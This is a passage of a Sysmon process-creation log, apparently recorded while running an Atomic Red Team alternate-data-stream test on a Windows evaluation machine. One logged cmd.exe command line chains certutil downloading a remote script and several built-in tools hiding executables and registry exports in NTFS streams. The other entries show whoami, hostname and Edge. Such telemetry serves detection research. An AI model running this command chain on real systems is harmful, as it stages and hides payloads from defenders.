      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:53.002

ProcessGuid: {fda94052-4b15-658d-6402-000000000b00}

ProcessId: 5324

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c type C:\temp\evil.exe &gt; ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"" &amp; extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe &amp; findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe &gt; c:\ADS\\file.txt:procexp.exe &amp; certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt &amp; makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab &amp; print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe &amp; reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg &amp; regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey &amp; expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat &amp; esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\whoami.exe""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\,whoami - displays logged on user information,,,,,,,1,9446,,10.0.22621.1 (WinBuild.160101.0800),"MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292",C:\Windows\System32\whoami.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:51.907

ProcessGuid: {fda94052-4b13-658d-6302-000000000b00}

ProcessId: 9292

Image: C:\Windows\System32\whoami.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: whoami - displays logged on user information

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: whoami.exe

CommandLine: ""C:\Windows\system32\whoami.exe""

CurrentDirectory: C:\Users\User\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,whoami.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-4b13-658d-6302-000000000b00},7044,9292,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T10:16:51.9100612Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 10:16:51.907,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:16:51.9100612Z""/>
      <EventRecordID>9446</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 10:16:51.907</Data>
      <Data Name=""ProcessGuid"">{fda94052-4b13-658d-6302-000000000b00}</Data>
      <Data Name=""ProcessId"">9292</Data>
      <Data Name=""Image"">C:\Windows\System32\whoami.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">whoami - displays logged on user information</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">whoami.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\whoami.exe""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:51.907

ProcessGuid: {fda94052-4b13-658d-6302-000000000b00}

ProcessId: 9292

Image: C:\Windows\System32\whoami.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: whoami - displays logged on user information

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: whoami.exe

CommandLine: ""C:\Windows\system32\whoami.exe""

CurrentDirectory: C:\Users\User\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\HOSTNAME.EXE""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\,Hostname APP,,,,,,,1,9445,,10.0.22621.2215 (WinBuild.160101.0800),"MD5=26D86E5BDA0ECA6C6C86541A141A3598,SHA256=D35B9869DA6A1894CB3F3D3E4808EADFF9ADF9B27677194D3F896FCBCDDFFACC,IMPHASH=23013EDF627646AB5226D15AC880BAD8",C:\Windows\System32\HOSTNAME.EXE,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:51.880

ProcessGuid: {fda94052-4b13-658d-6202-000000000b00}

ProcessId: 6188

Image: C:\Windows\System32\HOSTNAME.EXE

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Hostname APP

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: hostname.exe

CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""

CurrentDirectory: C:\Users\User\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=26D86E5BDA0ECA6C6C86541A141A3598,SHA256=D35B9869DA6A1894CB3F3D3E4808EADFF9ADF9B27677194D3F896FCBCDDFFACC,IMPHASH=23013EDF627646AB5226D15AC880BAD8

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,hostname.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-4b13-658d-6202-000000000b00},7044,6188,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T10:16:51.8818864Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 10:16:51.880,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:16:51.8818864Z""/>
      <EventRecordID>9445</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 10:16:51.880</Data>
      <Data Name=""ProcessGuid"">{fda94052-4b13-658d-6202-000000000b00}</Data>
      <Data Name=""ProcessId"">6188</Data>
      <Data Name=""Image"">C:\Windows\System32\HOSTNAME.EXE</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Hostname APP</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">hostname.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\HOSTNAME.EXE""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=26D86E5BDA0ECA6C6C86541A141A3598,SHA256=D35B9869DA6A1894CB3F3D3E4808EADFF9ADF9B27677194D3F896FCBCDDFFACC,IMPHASH=23013EDF627646AB5226D15AC880BAD8</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:51.880

ProcessGuid: {fda94052-4b13-658d-6202-000000000b00}

ProcessId: 6188

Image: C:\Windows\System32\HOSTNAME.EXE

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Hostname APP

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: hostname.exe

CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""

CurrentDirectory: C:\Users\User\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=26D86E5BDA0ECA6C6C86541A141A3598,SHA256=D35B9869DA6A1894CB3F3D3E4808EADFF9ADF9B27677194D3F896FCBCDDFFACC,IMPHASH=23013EDF627646AB5226D15AC880BAD8

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=data_decoder.mojom.DataDecoderService --lang=en-US --service-sandbox-type=service --mojo-platform-channel-handle=6060 --field-trial-handle=2012,i,14121881332492415831,1209340753367914572,262144 --variations-seed-version /prefetch:8",Microsoft Corporation,WinDev2309Eval,,C:\Program Files (x86)\Microsoft\Edge\Application\120.0.2210.91\,Microsoft Edge,,,,,,,1,9444,,120.0.2210.91,"MD5=F6E7A024CC79AC12294D0DA6072C5073,SHA256=628792B5B5A4D71B8D66B1A1C6B775B84E3A5E64C0C05B8D7138164FBAD5C21A,IMPHASH=EA4CA1F8E3B3D9373D39C13FD1348A63",C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,,Low,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:44.139

ProcessGuid: {fda94052-4b0c-658d-6102-000000000b00}

ProcessId: 3508

Image: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe

FileVersion: 120.0.2210.91

Description: Microsoft Edge

Product: Microsoft Edge

Company: Microsoft Corporation

OriginalFileName: msedge.exe

CommandLine: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=data_decoder.mojom.DataDecoderService --lang=en-US --service-sandbox-type=service --mojo-platform-channel-handle=6060 --field-trial-handle=2012,i,14121881332492415831,1209340753367914572,262144 --variations-seed-version /prefetch:8

CurrentDirectory: C:\Program Files (x86)\Microsoft\Edge\Application\120.0.2210.91\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Low

Hashes: MD5=F6E7A024CC79AC12294D0DA6072C5073,SHA256=628792B5B5A4D71B8D66B1A1C6B775B84E3A5E64C0C05B8D7138164FBAD5C21A,IMPHASH=EA4CA1F8E3B3D9373D39C13FD1348A63

ParentProcessGuid: {fda94052-b84e-658c-0402-000000000b00}

ParentProcessId: 8488

ParentImage: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe

ParentCommandLine: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-startup-window /prefetch:5

ParentUser: WINDEV2309EVAL\User",Info,msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-startup-window /prefetch:5",C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,{fda94052-b84e-658c-0402-000000000b00},8488,WINDEV2309EVAL\User,{fda94052-4b0c-658d-6102-000000000b00},7044,3508,Microsoft Edge,,,,,"
      ",-,,,,,,2023-12-28T10:16:44.1546840Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 10:16:44.139,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T10:16:44.1546840Z""/>
      <EventRecordID>9444</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 10:16:44.139</Data>
      <Data Name=""ProcessGuid"">{fda94052-4b0c-658d-6102-000000000b00}</Data>
      <Data Name=""ProcessId"">3508</Data>
      <Data Name=""Image"">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name=""FileVersion"">120.0.2210.91</Data>
      <Data Name=""Description"">Microsoft Edge</Data>
      <Data Name=""Product"">Microsoft Edge</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">msedge.exe</Data>
      <Data Name=""CommandLine"">""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=data_decoder.mojom.DataDecoderService --lang=en-US --service-sandbox-type=service --mojo-platform-channel-handle=6060 --field-trial-handle=2012,i,14121881332492415831,1209340753367914572,262144 --variations-seed-version /prefetch:8</Data>
      <Data Name=""CurrentDirectory"">C:\Program Files (x86)\Microsoft\Edge\Application\120.0.2210.91\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Low</Data>
      <Data Name=""Hashes"">MD5=F6E7A024CC79AC12294D0DA6072C5073,SHA256=628792B5B5A4D71B8D66B1A1C6B775B84E3A5E64C0C05B8D7138164FBAD5C21A,IMPHASH=EA4CA1F8E3B3D9373D39C13FD1348A63</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b84e-658c-0402-000000000b00}</Data>
      <Data Name=""ParentProcessId"">8488</Data>
      <Data Name=""ParentImage"">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-startup-window /prefetch:5</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 10:16:44.139

ProcessGuid: {fda94052-4b0c-658d-6102-000000000b00}

ProcessId: 3508

Image: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe

FileVersion: 120.0.2210.91

Description: Microsoft Edge

Product: Microsoft Edge

Company: Microsoft Corporation

OriginalFileName: msedge.exe

CommandLine: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=data_decoder.mojom.DataDecoderService --lang=en-US --service-sandbox-type=service --mojo-platform-channel-handle=6060 --field-trial-handle=2012,i,14121881332492415831,1209340753367914572,262144 --variations-seed-version /prefetch:8

CurrentDirectory: C:\Program Files (x86)\Microsoft\Edge\Application\120.0.2210.91\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Low

Hashes: MD5=F6E7A024CC79AC12294D0DA6072C5073,SHA256=628792B5B5A4D71B8D66B1A1C6B775B84E3A5E64C0C05B8D7138164FBAD5C21A,IMPHASH=EA4CA1F8E3B3D9373D39C13FD1348A63

ParentProcessGuid: {fda94052-b84e-658c-0402-000000000b00}

ParentProcessId: 8488

ParentImage: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe

ParentCommandLine: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-startup-window /prefetch:5

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
